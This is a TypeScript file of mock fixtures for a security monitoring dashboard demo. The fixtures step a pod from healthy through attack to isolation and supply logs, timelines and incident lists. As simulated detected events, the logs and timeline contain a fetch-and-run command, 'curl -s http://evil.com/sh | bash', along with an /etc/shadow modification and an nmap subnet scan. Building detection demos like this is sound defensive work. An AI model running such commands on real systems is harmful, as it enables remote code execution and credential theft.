// CC* scenario — client-side stepper over contract-true fixtures (Prism stateless).
// States: idle -> connected -> healthy -> attacked -> isolated
export type Phase = 'idle' | 'connected' | 'healthy' | 'attacked' | 'isolated'

export interface Pod {
  id: string
  hostname: string
  owner: string
  namespace: string
  status: 'Healthy' | 'Connecting' | 'NOT WORTHY'
  isActive: boolean
  cpu: number
  ram: number
  disk: number
  observed: boolean // the CC* target pod
}

export interface TimelineEvent { kind: 'ok' | 'bad'; climax?: boolean; h: string; s: string; t: string }

export const PHASES: Phase[] = ['idle', 'connected', 'healthy', 'attacked', 'isolated']

export function fleet(): Pod[] {
  return [
    { id: '0x4b5c…6a7b', hostname: 'ws-07', owner: 'Ola', namespace: 'prod/web', status: 'Healthy', isActive: true, cpu: 13, ram: 41, disk: 36, observed: false },
    { id: '0x9f8e…7d6c', hostname: 'db-02', owner: 'Jakub', namespace: 'prod/data', status: 'Healthy', isActive: true, cpu: 22, ram: 55, disk: 48, observed: false },
  ]
}

// the observed pod's state by phase
export function observedPod(phase: Phase): Pod | null {
  if (phase === 'idle') return null
  const base: Pod = {
    id: '0x1a2b…3c4d', hostname: 'alma9-edge-01', owner: 'Jakub', namespace: 'prod/edge',
    status: 'Healthy', isActive: true, cpu: 12, ram: 38, disk: 30, observed: true,
  }
  if (phase === 'connected') return { ...base, status: 'Connecting', cpu: 4, ram: 20, disk: 30 }
  if (phase === 'healthy') return base
  // attacked / isolated → breach
  return { ...base, status: 'NOT WORTHY', isActive: false, cpu: 96, ram: 92, disk: 71 }
}

// sparkline points (0..22 y, lower=worse-visual) for the observed pod
export function podSpark(phase: Phase): { points: string; color: string } {
  if (phase === 'attacked' || phase === 'isolated')
    return { points: '0,16 20,15 40,14 60,15 80,4 100,3 120,2', color: '#ef4444' }
  if (phase === 'connected') // CR-1 B-1: not yet attested → flat/grey pending
    return { points: '0,11 20,11 40,11 60,11 80,11 100,11 120,11', color: '#64748b' }
  return { points: '0,14 20,13 40,15 60,12 80,13 100,11 120,12', color: '#22c55e' }
}

// CR-1 B-3: NOT-OK log feed (eBPF/FIM/syslog) — visible without opening the drawer
export function recentLogs(phase: Phase): { t: string; lvl: string; msg: string }[] {
  if (phase !== 'attacked' && phase !== 'isolated')
    return [{ t: '14:40:02', lvl: 'ok', msg: 'eBPF execve: /usr/bin/node server.js' },
            { t: '14:39:51', lvl: 'ok', msg: 'TelemetryReported cpu=12% ram=38%' }]
  return [
    { t: '14:41:05', lvl: 'crit', msg: 'edr_registry::IncidentReport CRITICAL → KILLED_AND_ISOLATED' },
    { t: '14:41:04', lvl: 'crit', msg: 'talus::ClassificationReported anomaly=0.91 → TRIGGER_ISOLATION' },
    { t: '14:41:03', lvl: 'crit', msg: 'eBPF execve: curl -s http://evil.com/sh | bash' },
    { t: '14:41:03', lvl: 'warn', msg: 'FIM: /etc/shadow modified (LAST_COMMAND=passwd)' },
  ]
}

// CR-1 A-7 / P5: invite token looks real (base58-ish); still a mock until the invite contract ships
export const inviteToken = 'inv_8Qm4Zr2Tn9Kx7Wb3Yc6Hf1Ld'

export function timeline(phase: Phase): TimelineEvent[] {
  const evs: TimelineEvent[] = []
  const i = PHASES.indexOf(phase)
  if (i >= 1) evs.push({ kind: 'ok', h: 'Pod connected & attested', s: 'register_agent → AgentRegistered', t: '14:02:11' })
  if (i >= 2) evs.push({ kind: 'ok', h: 'Healthy — Sui interaction OK', s: 'TelemetryReported cpu 12% · ram 38%', t: '14:02–14:40' })
  if (i >= 3) {
    evs.push({ kind: 'bad', h: 'Kernel exploit / DDoS detected', s: 'eBPF execve: curl -s http://evil.com/sh | bash', t: '14:41:03' })
    evs.push({ kind: 'bad', h: 'AI classified anomaly 0.91 ≥ 0.85', s: 'ClassificationReported → TRIGGER_ISOLATION', t: '14:41:04' })
  }
  if (i >= 4) evs.push({ kind: 'bad', climax: true, h: 'Marked NOT WORTHY · isolated', s: 'IncidentReport CRITICAL · is_active=false', t: '14:41:05 · ⚡ 2s after detection' })
  return evs
}

export const responseActions = [
  { i: '📟', l: 'Notify on-call' },
  { i: '💬', l: 'Post to Slack #sec-incidents' },
  { i: '🧊', l: 'Freeze ports · isolate · kill in cloud' },
  { i: '🤖', l: 'Execute skill / connect Claude Code' },
]

export interface AppConfig {
  scope: string; network: string; packageId: string; mock: boolean
  // live-data integration points (answers I1, I2, I4, I9, I10) — filled next step
  suiRpcUrl?: string; wsUrl?: string; walrusGateway?: string; unstoppableDomain?: string
  agentApiBase?: string
}
export async function loadConfig(): Promise<AppConfig> {
  try {
    const r = await fetch('./config.json')
    return await r.json()
  } catch {
    return { scope: 'alfa', network: 'testnet', packageId: '0x0cc3…91af', mock: true }
  }
}

// ── mock data for the breadth surfaces (answers Part 3) — clearly non-functional ──
export const incidentTree = [
  { id: 'INC-991', sev: 'CRITICAL', title: 'Kernel exploit → isolation · alma9-edge-01',
    children: [
      { sev: 'HIGH', title: 'eBPF execve: curl … | bash', tx: '0x9aBc…01' },
      { sev: 'HIGH', title: 'Talus ClassificationReported 0.91 → TRIGGER_ISOLATION', tx: '0x7xYz…' },
      { sev: 'INFO', title: 'FIM: /etc/shadow modified (LAST_COMMAND)', tx: '0x33fe…' },
      { sev: 'INFO', title: 'C2 command_isolate_host (CommandQueue)', tx: '0x9aBc…02' },
    ] },
  { id: 'INC-984', sev: 'WARNING', title: 'Lateral-movement watch · ws-07', children: [
      { sev: 'WARNING', title: 'nmap -sV 10.0.0.0/24 → BLOCKED', tx: '0x41ab…' } ] },
]
export const personas = [
  { i: '👨‍💻', n: 'Internal Admin', d: 'Own SOC team · full data sovereignty (Edge)' },
  { i: '🕵️', n: 'SOC Freelancer', d: 'Delegated operator · scoped RBAC' },
  { i: '🏢', n: 'MSSP Agency', d: 'Multi-tenant fleet across clients' },
  { i: '📋', n: 'NIS2 Auditor', d: 'Read-only · chain-of-custody evidence' },
  { i: '⚖️', n: 'Insurance Adjuster', d: 'Read-only · incident proofs' },
]
export const modules = [
  ['Lithium', 'Cloud-Native K8s — Admission Controller + container-escape'],
  ['Neon', 'Network & SSL inspection (eBPF uprobes)'],
  ['Xenon', 'Deception & honeypots (0% FP)'],
  ['Silicon', 'UEBA AI profiling (on-device ML)'],
  ['Titanium', 'DLP data fortress'],
  ['Aluminum', 'Email phishing analysis (M365/G-Workspace)'],
  ['Magnesium', 'YARA offloading (MPC)'],
  ['Hydrogen', 'PAM — FIDO2 / Web3 keys'],
]
export const trustBadges = [
  ['🧠', 'Magnesium MPC + Talus AI', 'zero-day verification, never plaintext to provider'],
  ['🔐', 'SEAL homomorphic', 'correlate on encrypted telemetry'],
  ['⚡', 'eBPF zero-overhead', '<1% CPU, rootkit-resistant'],
  ['⛓️', 'Sui decentralized C2', 'no central takeover / SPOF'],
]
export const auditTrail = [
  ['14:41:07', 'analyst.eth', 'Opened INC-991', '0xaud…91'],
  ['14:41:22', 'analyst.eth', 'Acknowledged CRITICAL', '0xaud…92'],
  ['14:42:03', 'admin.eth', 'Confirmed isolation (KILLED_AND_ISOLATED)', '0xaud…93'],
]
export const integrations = [
  ['Splunk', 'Syslog CEF export', 'mock'], ['IBM QRadar', 'Webhook', 'mock'],
  ['Jira / ServiceNow', 'ITSM close-alert API', 'mock'], ['Slack', '#sec-incidents', 'mock'],
]
export const threatIntel = [
  { sev: 'CRITICAL', t: 'Honeytoken tripped — fake AWS key read', src: 'Xenon deception', fp: '0% FP' },
  { sev: 'HIGH', t: 'IoC match: evil.com C2 domain', src: 'MISP / STIX-TAXII', fp: '' },
]
